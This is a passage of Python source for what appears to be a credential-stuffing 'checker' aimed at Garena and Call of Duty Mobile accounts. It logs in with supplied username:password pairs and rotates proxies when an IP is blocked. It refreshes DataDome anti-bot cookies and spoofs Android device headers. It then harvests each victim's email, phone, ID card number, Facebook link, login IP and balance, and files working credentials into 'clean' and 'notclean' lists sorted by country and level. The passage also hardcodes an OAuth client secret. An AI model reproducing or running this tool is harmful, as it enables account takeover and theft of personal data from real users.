                        return None, None, new_cookies.get('datadome')
                        
                    if attempt < retries - 1:
                        time.sleep(2)
                        continue
                    return None, None, new_cookies.get('datadome')
                else:
                    logger.error(f"      HTTP {e.response.status_code}")
                    logger.error(f"      Server error")
            else:
                logger.error(f"      Connection error")
                logger.error(f"      Could not reach server")
                
            if attempt < retries - 1:
                time.sleep(2)
                continue
        except Exception as e:
            logger.error(f"      Unexpected error: {str(e)[:50]}")
            if attempt < retries - 1:
                time.sleep(2)
                
    return None, None, None


def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    
    url = 'https://100082.connect.garena.com/api/login'
    params = {
        'app_id': '100082',
        'account': account,
        'password': hashed_password,
        'redirect_uri': 'gop100082://auth/',
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    
    current_cookies = session.cookies.get_dict()
    cookie_parts = []
    for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
        if cookie_name in current_cookies:
            cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
    
    
    dev = _device_manager.get_next()
    headers = {
        'accept':            'application/json, text/plain, */*',
        'accept-encoding':   'gzip, deflate, br, zstd',
        'accept-language':   'en-US,en;q=0.9',
        'host':              '100082.connect.garena.com',
        'referer': (
            'https://100082.connect.garena.com/universal/oauth'
            '?client_id=100082&locale=en-US&create_grant=true'
            '&login_scenario=normal&redirect_uri=gop100082://auth/'
            '&response_type=code'
        ),
        'sec-ch-ua': (
            f'"Not(A:Brand";v="8", '
            f'"Chromium";v="{dev["chrome_major"]}", '
            f'"Android WebView";v="{dev["chrome_major"]}"'
        ),
        'sec-ch-ua-mobile':   '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest':     'empty',
        'sec-fetch-mode':     'cors',
        'sec-fetch-site':     'same-origin',
        'x-requested-with':   'com.garena.game.codm',
        'user-agent':         dev["ua_full"],
    }

    if cookie_header:
        headers['cookie'] = cookie_header

    retries = 3
    for attempt in range(retries):
        try:
            
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for _cn in ['apple_state_key', 'datadome', 'sso_key']:
                if _cn in current_cookies:
                    cookie_parts.append(f"{_cn}={current_cookies[_cn]}")
            headers['cookie'] = '; '.join(cookie_parts) if cookie_parts else ''

            response = session.get(url, headers=headers, params=params, timeout=12)


            if response.status_code == 403:
                fresh_dd = get_datadome_cookie(session)
                if fresh_dd:
                    session.cookies.set('datadome', fresh_dd, domain='.garena.com')
                if attempt < retries - 1:
                    time.sleep(1)
                    continue
                return None

            response.raise_for_status()

            login_cookies = {}

            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                login_cookies[cookie_name] = cookie_value
                        except Exception:
                            pass

            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in login_cookies:
                        login_cookies[cookie_name] = cookie_value
            except Exception:
                pass

            for cookie_name, cookie_value in login_cookies.items():
                if cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                logger.error(f"      Invalid JSON response from login")
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None
            
            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
            
            if 'error' in data:
                error_msg = data['error']
                
                if error_msg == 'ACCOUNT DOESNT EXIST':
                    logger.warning(f"     Login failed: Invalid credentials")
                    logger.warning(f"         Reason: {error_msg}")
                    return None
                elif 'captcha' in error_msg.lower():
                    logger.warning(f"     Login failed: Captcha required")
                    logger.warning(f"         Reason: {error_msg}")
                    time.sleep(3)
                    continue
                else:
                    logger.warning(f"     Login failed: Invalid credentials")
                    logger.warning(f"         Reason: {error_msg}")
                    return None
                    
            return sso_key
            
        except requests.RequestException as e:
            logger.error(f"      Login request failed (attempt {attempt + 1}): {e}")
            if attempt < retries - 1:
                time.sleep(2)
                
    return None


def get_codm_access_token(session):
    try:
        random_id = str(int(time.time() * 1000))

        
        grant_url = "https://100082.connect.garena.com/oauth/token/grant"
        grant_headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) "
                           "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 "
                           "Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)",
            "Pragma": "no-cache",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
            "Origin": "https://100082.connect.garena.com",
            "Referer": "https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code",
        }

        grant_data = {
            "client_id": "100082",
            "response_type": "code",
            "redirect_uri": "gop100082://auth/",
            "create_grant": "true",
            "login_scenario": "normal",
            "format": "json",
            "id": random_id,
        }

        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=12)
        grant_response.raise_for_status()
        grant_json = grant_response.json()

        auth_code = grant_json.get("code")
        if not auth_code:
            logger.error("[ERROR] CODM token grant failed: no authorization code in response")
            return ""

        
        exchange_url = "https://100082.connect.garena.com/oauth/token/exchange"
        exchange_headers = {
            "User-Agent": "GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        
        exchange_data = {
            "grant_type": "authorization_code",
            "code": auth_code,
            "device_id": "02-dc0cd806-a2b4-48ff-b5b5-0264b847352d",
            "redirect_uri": "gop100082://auth/",
            "source": "2",
            "client_id": "100082",
            "client_secret": "388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415",
        }

        exchange_response = session.post(exchange_url, headers=exchange_headers, data=exchange_data, timeout=12)
        exchange_response.raise_for_status()
        exchange_json = exchange_response.json()

        access_token = exchange_json.get("access_token")
        if not access_token:
            logger.error("[ERROR] CODM token exchange failed: no access_token in response")
            return ""

        return access_token
    except Exception as e:
        logger.error(f"[ERROR] Error getting CODM access token: {e}")
        return ""

def process_codm_callback(session, access_token):
    try:
        codm_callback_url = f"https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/&access_token={access_token}"
        callback_headers = {
            "authority": "auth.codm.garena.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        callback_response = session.get(codm_callback_url, headers=callback_headers, allow_redirects=False)
        
        api_callback_url = f"https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}"
        api_callback_headers = {
            "authority": "api-delete-request.codm.garena.co.id",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "cross-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        api_callback_response = session.get(api_callback_url, headers=api_callback_headers, allow_redirects=False)
        location = api_callback_response.headers.get("Location", "")
        
        if "err=3" in location:
            return None, "no_codm"
        elif "token=" in location:
            token = location.split("token=")[-1].split('&')[0]
            return token, "success"
        else:
            return None, "unknown_error"
            
    except Exception as e:
        logger.error(f"[ERROR] Error processing CODM callback: {e}")
        return None, "error"

def get_codm_user_info(session, token):
    try:
        check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/"
        check_headers = {
            "authority": "api-delete-request.codm.garena.co.id",
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "accept-encoding": "gzip, deflate, br, zstd",
            "cache-control": "no-cache",
            "codm-delete-token": token,
            "origin": "https://delete-request.codm.garena.co.id",
            "pragma": "no-cache",
            "referer": "https://delete-request.codm.garena.co.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v=\"24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
        
        check_response = session.get(check_login_url, headers=check_headers)
        check_data = check_response.json()
        
        user_data = check_data.get("user", {})
        if user_data:
            return {
                "codm_nickname": user_data.get("codm_nickname", "N/A"),
                "codm_level": user_data.get("codm_level", "N/A"),
                "region": user_data.get("region", "N/A"),
                "uid": user_data.get("uid", "N/A"),
                "open_id": user_data.get("open_id", "N/A"),
                "t_open_id": user_data.get("t_open_id", "N/A")
            }
        return {}
        
    except Exception as e:
        logger.error(f" Error getting CODM user info: {e}")
        return {}

def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    try:
        access_token = get_codm_access_token(session)
        if not access_token:
            logger.warning('      No CODM access token')
            return (has_codm, codm_info)
        else:
            codm_token, status = process_codm_callback(session, access_token)
            if status == 'no_codm':
                logger.info('      No CODM detected')
                return (has_codm, codm_info)
            else:
                if status != 'success' or not codm_token:
                    logger.warning(f'      CODM callback failed: {status}')
                    return (has_codm, codm_info)
                else:
                    codm_info = get_codm_user_info(session, codm_token)
                    if codm_info:
                        has_codm = True
                        logger.info(f"      CODM detected: Level {codm_info.get('codm_level', 'N/A')}")
    except Exception as e:
        logger.error(f'      Error checking CODM: {e}')
    return (has_codm, codm_info)

def display_codm_info(account_details, codm_info):
    if not codm_info:
        return ""
    
    if isinstance(account_details, str):
        account_details = {
            'username': account_details,
            'nickname': 'N/A',
            'email': account_details,
            'personal': {
                'mobile_no': 'N/A',
                'country': 'N/A',
                'id_card': 'N/A'
            },
            'bind_status': 'N/A',
            'security_status': 'N/A',
            'profile': {
                'shell_balance': 'N/A'
            },
            'status': {
                'account_status': 'N/A'
            },
            'game_info': []
        }
    
    display_text = f" Username: {account_details.get('username', 'N/A')}\n"
    display_text += f" Nickname: {account_details.get('nickname', 'N/A')}\n"
    display_text += f" Email: {account_details.get('email', 'N/A')}\n"
    display_text += f" Phone: {account_details['personal'].get('mobile_no', 'N/A')}\n"
    display_text += f" Country: {account_details['personal'].get('country', 'N/A')}\n"
    display_text += f" ID Card: {account_details['personal'].get('id_card', 'N/A')}\n"
    display_text += f" Bind Status: {account_details.get('bind_status', 'N/A')}\n"
    display_text += f" Security: {account_details.get('security_status', 'N/A')}\n"
    display_text += f" Shell Balance: {account_details['profile'].get('shell_balance', 'N/A')}\n"
    display_text += f" Account Status: {account_details['status'].get('account_status', 'N/A')}\n"
    display_text += " CODM INFO:\n"
    display_text += f"   Nickname: {codm_info.get('codm_nickname', 'N/A')}\n"
    display_text += f"   Level: {codm_info.get('codm_level', 'N/A')}\n"
    display_text += f"   Region: {codm_info.get('region', 'N/A')}\n"
    display_text += f"   UID: {codm_info.get('uid', 'N/A')}\n"
    
    return display_text

def save_codm_account(account, password, codm_info, country='N/A', is_clean=False, result_folder='Results'):
    try:
        if not codm_info:
            return
            
        codm_level = int(codm_info.get('codm_level', 0))
        region = codm_info.get('region', 'N/A').upper()
        nickname = codm_info.get('codm_nickname', 'N/A')
        
        if isinstance(country, dict):
            country_code = country.get('country', 'N/A').upper() if country.get('country') else region
        else:
            country_code = country.upper() if country and country != 'N/A' else region
            
        if country_code == 'N/A' or not country_code or country_code == 'NONE':
            country_code = region if region and region != 'N/A' else 'UNKNOWN'

        if codm_level <= 50:
            level_range = "1-50"
        elif codm_level <= 100:
            level_range = "51-100"
        elif codm_level <= 150:
            level_range = "101-150"
        elif codm_level <= 200:
            level_range = "151-200"
        elif codm_level <= 250:
            level_range = "201-250"
        elif codm_level <= 300:
            level_range = "251-300"
        elif codm_level <= 350:
            level_range = "301-350"
        else:
            level_range = "351+"

        clean_folder = "Clean" if is_clean else "NotClean"
        
        folder_path = os.path.join(result_folder, clean_folder, country_code)
        os.makedirs(folder_path, exist_ok=True)
        
        level_file = os.path.join(folder_path, f"{level_range}_accounts.txt")
        
        account_exists = False
        if os.path.exists(level_file):
            with open(level_file, "r", encoding="utf-8") as f:
                existing_content = f.read()
                if account in existing_content:
                    account_exists = True
        
        if not account_exists:
            with open(level_file, "a", encoding="utf-8") as f:
                if account and password:
                    f.write(f"{account}:{password} | Level: {codm_level} | Nickname: {nickname} | Region: {region} | UID: {codm_info.get('uid', 'N/A')}\n")
            
    except Exception as e:
        pass


def save_clean_or_notclean(account, password, details, codm_info, result_folder='Results'):
    try:
        if not codm_info:
            return

        if str(codm_info.get('codm_nickname', '')).upper() in ['', 'N/A', 'NONE']:
            return

        os.makedirs(result_folder, exist_ok=True)

        codm_nickname = codm_info.get('codm_nickname') or details.get('nickname', '')
        codm_uid = codm_info.get('uid') or details.get('uid', '')
        codm_level = codm_info.get('codm_level') or '0'

        username = details.get('username', account)

        email = details.get('email', '')
        email_verified_flag = bool(details.get('email_verified'))
        email_ver = "Verified" if email_verified_flag else "Not Verified"

        mobile = details.get('personal', {}).get('mobile_no', '')
        shell = details.get('profile', {}).get('shell_balance', '0')

        acc_country = details.get('personal', {}).get('country', '')
        region = codm_info.get('region') or acc_country

        garena_nickname = details.get('nickname', '')

        fb_connected = details.get('security', {}).get('facebook_connected', False)

        fb_account = details.get('security', {}).get('facebook_account', {})

        if isinstance(fb_account, dict):
            fb_username = fb_account.get('fb_username', 'N/A')
            fb_uid = fb_account.get('fb_uid', 'N/A')

            if fb_uid != 'N/A':
                fb_account = f"https://facebook.com/{fb_uid}"
            else:
                fb_account = fb_username

        if not fb_account or str(fb_account).strip() == "":
            fb_account = "N/A"

        fb_status = "CONNECTED" if fb_connected else "NOT CONNECTED"

        bindings = ", ".join(details.get('binds', []))
        if not bindings:
            bindings = "None"

        is_clean = details.get('is_clean', False)

        file_path = os.path.join(
            result_folder,
            'clean.txt' if is_clean else 'notclean.txt'
        )

        save_number = 1

        if os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8") as sf:
                save_number = sum(
                    1 for line in sf
                    if line.strip().startswith(tuple(str(i) for i in range(10)))
                ) + 1

        content_to_save = f"""
{save_number}. {account}:{password} =>
          Clean: {"Yes" if is_clean else "No"}
          Status: Valid
          ---
          Player Info =>
              UID: {codm_uid}
              Nickname: {codm_nickname}
              Level: {codm_level}
              Shell Balance: {shell}
              Region: {region}
              Email: {email} ({email_ver})
              Phone: {mobile}
              Country: {acc_country}
              Garena UID: {details.get('uid', '')}
              Username: {username}
              Nickname (Garena): {garena_nickname}
          ---
          Last Login: {details.get('last_login', 'Unknown')}
          From: Garena Mobile ({details.get('last_login_where', 'N/A')})
          Facebook Status: {fb_status}
          Facebook Link: {fb_account}
          Bindings: {bindings}
          --
"""

        account_exists = False

        if os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8") as f:
                if f"{account}:{password}" in f.read():
                    account_exists = True

        if not account_exists:
            with open(file_path, "a", encoding="utf-8") as f:
                f.write(content_to_save.strip() + "\n\n")

        save_codm_account(
            account,
            password,
            codm_info,
            acc_country,
            is_clean,
            result_folder
        )

    except Exception as e:
        pass


def save_account_details_full(account, details, codm_info=None, password=None, result_folder='Results'):
    try:
        if not codm_info:
            return

        if str(codm_info.get('codm_nickname', '')).upper() in ['', 'N/A', 'NONE']:
            return

        os.makedirs(result_folder, exist_ok=True)

        full_file = os.path.join(result_folder, 'full_details.txt')

        codm_name = codm_info.get('codm_nickname') or details.get('nickname', '')
        codm_uid = codm_info.get('uid') or details.get('uid', '')
        codm_region = codm_info.get('region') or details.get('personal', {}).get('country', '')
        codm_level = codm_info.get('codm_level') or '0'

        shell = details.get('profile', {}).get('shell_balance', '0')

        email = details.get('email', '')
        email_verified = "Verified" if details.get('email_verified') else "Not Verified"

        phone = details.get('personal', {}).get('mobile_no', '')
        country = details.get('personal', {}).get('country', '')

        garena_nickname = details.get('nickname', '')

        fb_connected = details.get('security', {}).get('facebook_connected', False)

        fb_account = details.get('security', {}).get('facebook_account', {})

        if isinstance(fb_account, dict):
            fb_username = fb_account.get('fb_username', 'N/A')
            fb_uid = fb_account.get('fb_uid', 'N/A')

            if fb_uid != 'N/A':
                fb_account = f"https://facebook.com/{fb_uid}"
            else:
                fb_account = fb_username

        if not fb_account or str(fb_account).strip() == "":
            fb_account = "N/A"

        fb_status = "CONNECTED" if fb_connected else "NOT CONNECTED"

        bindings = ", ".join(details.get('binds', []))
        if not bindings:
            bindings = "None"

        is_clean = details.get('is_clean', False)

        save_number = 1

        if os.path.exists(full_file):
            with open(full_file, "r", encoding="utf-8") as sf:
                save_number = sum(
                    1 for line in sf
                    if line.strip().startswith(tuple(str(i) for i in range(10)))
                ) + 1

        content = f"""
{save_number}. {account}:{password} =>
          Clean: {"Yes" if is_clean else "No"}
          Status: Valid
          ---
          Player Info =>
              UID: {codm_uid}
              Nickname: {codm_name}
              Level: {codm_level}
              Shell Balance: {shell}
              Region: {codm_region}
              Email: {email} ({email_verified})
              Phone: {phone}
              Country: {country}
              Garena UID: {details.get('uid', '')}
              Username: {account}
              Nickname (Garena): {garena_nickname}
          ---
          Last Login: {details.get('last_login', 'Unknown')}
          From: Garena Mobile ({details.get('last_login_where', 'N/A')})
          Facebook Status: {fb_status}
          Facebook Link: {fb_account}
          Bindings: {bindings}
          --
"""

        account_exists = False

        if os.path.exists(full_file):
            with open(full_file, "r", encoding="utf-8") as f:
                if f"{account}:{password}" in f.read():
                    account_exists = True

        if not account_exists:
            with open(full_file, "a", encoding="utf-8") as f:
                f.write(content.strip() + "\n\n")

    except Exception as e:
        pass

def parse_account_details(data):
    user_info = data.get('user_info', {})
    
    account_info = {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': user_info.get('email', 'N/A'),
        'email_verified': bool(user_info.get('email_v', 0)),
        'email_verified_time': user_info.get('email_verified_time', 0),
        'email_verify_available': bool(user_info.get('email_verify_available', False)),
        
        'security': {
            'password_strength': user_info.get('password_s', 'N/A'),
            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
            'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
            'facebook_account': user_info.get('fb_account', None),
            'suspicious': bool(user_info.get('suspicious', False))
        },
        
        'personal': {
            'real_name': user_info.get('realname', 'N/A'),
            'id_card': user_info.get('idcard', 'N/A'),
            'id_card_length': user_info.get('idcard_length', 'N/A'),
            'country': user_info.get('acc_country', 'N/A'),
            'country_code': user_info.get('country_code', 'N/A'),
            'mobile_no': user_info.get('mobile_no', 'N/A'),
            'mobile_binding_status': "Bound" if user_info.get('mobile_binding_status', 0) and user_info.get('mobile_no', '') else "Not Bound",
            'extra_data': user_info.get('realinfo_extra_data', {})
        },
        
        'profile': {
            'avatar': user_info.get('avatar', 'N/A'),
            'signature': user_info.get('signature', 'N/A'),
            'shell_balance': user_info.get('shell', 0)
        },
        
        'status': {
            'account_status': "Active" if user_info.get('status', 0) == 1 else "Inactive",
            'whitelistable': bool(user_info.get('whitelistable', False)),
            'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))
        },
        
        'binds': [],
        'game_info': []
    }

    email = account_info['email']
    if email != 'N/A' and email and not email.startswith('***') and '@' in email and not email.endswith('@gmail.com') and '****' not in email:
        account_info['binds'].append('Email')
    
    mobile_no = account_info['personal']['mobile_no']
    if mobile_no != 'N/A' and mobile_no and mobile_no.strip():
        account_info['binds'].append('Phone')
    
    if account_info['security']['facebook_connected']:
        account_info['binds'].append('Facebook')
    
    id_card = account_info['personal']['id_card']
    if id_card != 'N/A' and id_card and id_card.strip():
        account_info['binds'].append('ID Card')
    
    dirty_binds = [b for b in account_info['binds'] if b not in ['Facebook']]

    if user_info.get('email_v', 0) == 1 or len(dirty_binds) > 0:
        account_info['is_clean'] = False
        account_info['bind_status'] = f"Bound ({', '.join(dirty_binds) or 'Email Verified'})"
    else:
        account_info['is_clean'] = True
        account_info['bind_status'] = "Clean"

    security_indicators = []
    if account_info['security']['two_step_verify']:
        security_indicators.append("2FA")
    if account_info['security']['authenticator_app']:
        security_indicators.append("Auth App")
    if account_info['security']['suspicious']:
        security_indicators.append("[WARNING] Suspicious")
    
    account_info['security_status'] = "[SUCCESS] Normal" if not security_indicators else " | ".join(security_indicators)

    return account_info


def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, result_folder='Results', telegram_config=None):
    try:
        MAX_IP_BLOCK_RETRIES = 5
        v1, v2, new_datadome = None, None, None

        for ip_block_attempt in range(MAX_IP_BLOCK_RETRIES):
            datadome_manager.clear_session_datadome(session)
            current_datadome = datadome_manager.get_datadome()
            if current_datadome:
                datadome_manager.set_session_datadome(session, current_datadome)

            v1, v2, new_datadome = prelogin(session, account, datadome_manager, telegram_config=telegram_config)

            if v1 == "IP_BLOCKED":
                logger.warning(f"[RETRY] IP blocked attempt {ip_block_attempt + 1}/{MAX_IP_BLOCK_RETRIES} rotating proxy...")
                new_proxy = geo_rotator.force_rotate()
                session.proxies.update(geo_rotator.get_proxies())
                time.sleep(1.0)
                continue

            if v1 == "CONN_ERROR":
                logger.warning(f"[RETRY] Proxy dead/rate-limited attempt {ip_block_attempt + 1}/{MAX_IP_BLOCK_RETRIES} rotating proxy immediately...")
                new_proxy = geo_rotator.force_rotate()
                session.proxies.update(geo_rotator.get_proxies())
                logger.info(f"[RETRY] Switched to proxy: {new_proxy}")
                fresh_dd = get_datadome_cookie(session)
                if fresh_dd:
                    datadome_manager.set_datadome(fresh_dd)
                    datadome_manager.set_session_datadome(session, fresh_dd)
                continue

            break

        if v1 in ("IP_BLOCKED", "CONN_ERROR"):
            logger.error(f"[RETRY] Exhausted {MAX_IP_BLOCK_RETRIES} retries for {account} skipping")
            live_stats.update_stats(valid=False)
            return f"Proxy exhausted - Skipped after {MAX_IP_BLOCK_RETRIES} retries"

        if not v1 or not v2:
            live_stats.update_stats(valid=False)
            return ""
        
        if new_datadome:
            datadome_manager.set_datadome(new_datadome)
            datadome_manager.set_session_datadome(session, new_datadome)
        
        sso_key = login(session, account, password, v1, v2)
        
        if not sso_key:
            live_stats.update_stats(valid=False)
            return ""
        
        account_data = None
        for init_attempt in range(4):
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''

            headers = {
                'accept': '*/*',
                'referer': 'https://account.garena.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
            }
            if cookie_header:
                headers['cookie'] = cookie_header

            response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=30)

            if response.status_code == 403:
                logger.warning(f"[INIT] 403 on account/init attempt {init_attempt + 1}/4")
                if datadome_manager.handle_403(session):
                    logger.info(f"[INIT] Proxy rotated waiting {2 + init_attempt}s before retrying account/init...")
                    time.sleep(2.0 + init_attempt * 1.0)
                    session.proxies.update(geo_rotator.get_proxies())
                    continue
                else:
                    live_stats.update_stats(valid=False)
                    return f"Banned (Cookie flagged)"

            try:
                account_data = response.json()
            except json.JSONDecodeError:
                logger.error(f"      Invalid JSON response from account init")
                live_stats.update_stats(valid=False)
                return ""
            break

        if account_data is None:
            logger.error(f"[INIT] Failed account/init after all retries skipping")
            live_stats.update_stats(valid=False)
            return f"IP Blocked - account/init failed after retries"

        if 'error' in account_data:
            if account_data.get('error') == 'ACCOUNT DOESNT EXIST':
                live_stats.update_stats(valid=False)
                return ""
            live_stats.update_stats(valid=False)
            logger.error(f"      Error fetching details: {account_data['error']}")
            return ""
        
        if 'user_info' in account_data:
            details = parse_account_details(account_data)
        else:
            details = parse_account_details({'user_info': account_data})
        
        login_history = account_data.get('login_history') or []
        last_login_ip = None
        last_login_where = None
        last_login_ts = None

        if isinstance(login_history, list) and login_history:
            entry = login_history[0]
            if isinstance(entry, dict):
                last_login_ip = entry.get('ip') or entry.get('login_ip') or entry.get('ip_address')
                last_login_where = entry.get('country') or entry.get('location') or entry.get('region')
                last_login_ts = entry.get('timestamp')
        
        if not last_login_ip or not last_login_where:
            latest_metric = -1
            for filename in os.listdir('.'):
                if not filename.endswith('.json'):
                    continue
                try:
                    with open(filename, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                except Exception:
                    continue
                try:
                    meta = (data.get('metadata') or {})
                    url_info = (meta.get('url') or {})
                    dom = url_info.get('domain', '')
                    path = url_info.get('path', '')
                    if 'account.garena.com' not in dom or '/api/account/init' not in path:
                        continue
                    body_str = (data.get('response') or {}).get('body')
                    if not isinstance(body_str, str):
                        continue
                    try:
                        body = json.loads(body_str)
                    except Exception:
                        continue
                    ui = body.get('user_info') or {}
                    uname = ui.get('username') or ''
                    email = ui.get('email') or ''
                    if (uname and uname == account) or (email and email == account):
                        lh = body.get('login_history') or []
                        if isinstance(lh, list) and lh:
                            e = lh[0]
                            end_val = ((meta.get('timestamps') or {}).get('end')) or ''
                            metric = 0
                            if end_val:
                                try:
                                    metric = int(''.join([c for c in str(end_val) if c.isdigit()]) or '0')
                                except Exception:
                                    metric = 0
                            if not metric:
                                metric = int(e.get('timestamp') or 0)
                            if metric > latest_metric:
                                latest_metric = metric
                                last_login_ip = e.get('ip') or e.get('login_ip') or e.get('ip_address')
                                last_login_where = e.get('country') or e.get('location') or e.get('region')
                                last_login_ts = e.get('timestamp') or None
                                if not account_data.get('init_ip') and body.get('init_ip'):
                                    account_data['init_ip'] = body.get('init_ip')
                                if not account_data.get('country') and body.get('country'):
                                    account_data['country'] = body.get('country')
                except Exception:
                    continue
        
        def fmt_ts(ts):
            try:
                ts_int = int(ts)
                return datetime.fromtimestamp(ts_int, tz=timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')
            except Exception:
                return 'Unknown'

        last_login_str = fmt_ts(last_login_ts) if last_login_ts else 'Unknown'
        details['last_login'] = last_login_str
        details['last_login_where'] = last_login_where or 'N/A'
        ip_for_msg = last_login_ip or account_data.get('init_ip') or 'N/A'
        details['ip_for_msg'] = ip_for_msg
        if account_data.get('country'):
            details['country'] = account_data.get('country')
        
        has_codm, codm_info = check_codm_account(session, account)
        
        def is_codm_invalid(info):
            if not info:
                return True
            if isinstance(info, str):
                return "error" in info.lower()
            if isinstance(info, dict):
                invalid_values = ["", "N/A", "NONE", "NULL", "ERROR"]
                if all(str(v).strip().upper() in invalid_values for v in info.values()):
                    return True
                if str(info.get('codm_nickname', '')).strip().upper() in invalid_values:
                    return True
            return False

        if not has_codm or is_codm_invalid(codm_info):
            live_stats.update_stats(valid=True, clean=details.get('is_clean', False), has_codm=False)
            save_clean_or_notclean(account, password, details, codm_info if has_codm else None, result_folder)
            save_account_details_full(account, details, codm_info if has_codm else None, password, result_folder)
            return ""
        
        fresh_datadome = datadome_manager.extract_datadome_from_session(session)
        if fresh_datadome:
            cookie_manager.save_cookie(fresh_datadome)
        
        save_account_details_full(account, details, codm_info if has_codm else None, password, result_folder)
        save_clean_or_notclean(account, password, details, codm_info if has_codm else None, result_folder)

        live_stats.update_stats(valid=True, clean=details['is_clean'], has_codm=has_codm)
        
        username = details.get('username', account)
        email = details.get('email', 'N/A')
        email_verified_flag = details.get('email_verified') if isinstance(details.get('email_verified'), bool) else False
        email_ver = "Verified" if email_verified_flag else "Not Verified"
        mobile = details.get('personal', {}).get('mobile_no', 'N/A')
        mobile_display = mobile if mobile and str(mobile).strip() else "None"
        mobile_bound = f"{Colors.GREEN}Yes{Colors.RESET}" if mobile and str(mobile).strip() else f"{Colors.RED}No{Colors.RESET}"
        email_verified_display = f"{Colors.GREEN}Yes{Colors.RESET}" if email_verified_flag else f"{Colors.RED}No{Colors.RESET}"

        shell = details.get('profile', {}).get('shell_balance', 'N/A')
        acc_country = details.get('personal', {}).get('country', 'N/A')

        authenticator_enabled = "Yes" if details.get('security', {}).get('authenticator_app') else "No"
        two_step_enabled = "Yes" if details.get('security', {}).get('two_step_verify') else "No"
